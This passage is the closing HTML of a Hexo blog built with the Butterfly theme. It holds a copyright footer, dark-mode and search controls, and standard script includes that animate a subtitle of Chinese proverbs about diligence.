class="copyright">&copy;2022 - 2024 By 唐仔橙</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。","勤能补拙,天道酬勤"],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = '应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>